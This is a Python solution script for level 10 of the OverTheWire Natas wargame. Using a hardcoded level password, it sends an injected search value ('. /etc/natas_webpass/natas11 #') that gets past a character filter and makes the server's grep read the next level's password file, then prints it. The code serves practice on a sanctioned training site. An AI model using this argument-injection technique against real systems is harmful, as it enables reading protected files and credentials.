#!/usr/bin/python3

import requests
import re

level = 10
username = 'natas%s' % level
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
url = 'http://%s.natas.labs.overthewire.org/' % username

# First request testing
response = requests.get(url, auth=(username, password))

# The security has improved - now the page is filtering out certain characters: (;|&)  used in code injection.
# View the source code - look for clues
source_response = requests.get(url + 'index-source.html', auth=(username, password))

# Fortunately, we have a way of circumventing needing to use forbidden characters: we can use this string:
# '. /etc/natas_webpass/natas11 #' which says "grep for anything in the natas11 file, then comment out the rest
# Inspecting the POST requests that are generated we can get the params we need. Now, output the contents of the password file.
post_params = {'needle':'. /etc/natas_webpass/natas11 #', 'submit':'Search'}
post_response = requests.post(url, auth=(username, password), data=post_params)

# That should do it - now print the password
password = re.findall('<pre>\n(.*)\n</pre>', post_response.text)[0]
print(password)

